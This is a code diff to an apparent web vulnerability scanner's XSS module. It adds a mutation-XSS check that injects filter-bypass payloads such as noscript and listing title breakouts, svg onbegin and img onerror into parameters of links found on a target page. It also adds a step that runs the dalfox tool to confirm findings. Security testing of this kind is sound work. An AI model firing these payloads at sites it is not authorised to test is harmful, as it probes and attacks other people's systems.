@@ -55,6 +55,57 @@ class XssModule(BaseModule):
     NAME        = "xss"
     DESCRIPTION = "XSS — reflected, DOM hints, JSON, headers, context-aware"
 
+    def _test_mxss(self):
+        """Mutation XSS - bypass via browser DOM mutation."""
+        mxss_payloads = [
+            "<listing><p title='</listing><img src=x onerror=alert(1)>'>",
+            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
+            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+            "<!--<img src=--><img src=x onerror=alert(1)>-->",
+        ]
+        r0 = self.get("")
+        if not r0: return
+        import re as _re
+        links = _re.findall(r'href=["\']([^"\'#]+\?[^"\'#]+)["\']', r0.text)
+        for link in links[:3]:
+            if link.startswith("/"): link = f"{self.parsed.scheme}://{self.parsed.netloc}{link}"
+            from urllib.parse import urlparse as _up, parse_qs as _pq
+            p2 = _up(link)
+            for param in list(_pq(p2.query).keys())[:2]:
+                for payload in mxss_payloads[:2]:
+                    r = self.get(p2.path, params={param: payload})
+                    if r and payload[:15] in r.text:
+                        self.add_finding(
+                            title=f"Potential mXSS — Parameter {param!r}",
+                            severity="MEDIUM",
+                            description="Mutation XSS payload reflected. Browser DOM parsing may enable execution.",
+                            evidence=f"Param: {param}\nPayload: {payload[:80]}\nReflected",
+                            remediation="Use DOMPurify. Never insert user content via innerHTML.",
+                            url=link, parameter=param, payload=payload, cve="CWE-79")
+                        return
+
+    def _run_dalfox(self):
+        import shutil, subprocess
+        if not shutil.which("dalfox") or not self.findings:
+            return
+        for f in list(self.findings)[:3]:
+            url = f.get("url","")
+            param = f.get("parameter","")
+            if not url or not param:
+                continue
+            try:
+                r = subprocess.run(
+                    ["dalfox","url",f"{url}?{param}=test",
+                     "--silence","--no-spinner"],
+                    capture_output=True, text=True, timeout=30
+                )
+                if "POC" in r.stdout or "alert" in r.stdout.lower():
+                    f["severity"] = "HIGH"
+                    f["proof"] = f"Dalfox confirmed XSS: {r.stdout[:200]}"
+                    f["title"] = f["title"].replace("Potential","Confirmed")
+            except Exception:
+                pass
+
     def run(self):
         self.log("Testing for Cross-Site Scripting (XSS)...")
 
@@ -70,6 +121,8 @@ class XssModule(BaseModule):
         # Test headers
         self._test_headers()
 
+        # Dalfox confirmation
+        self._run_dalfox()
         self.log(f"XSS scan complete — {len(self.findings)} findings", "+")
         return self.result()
 
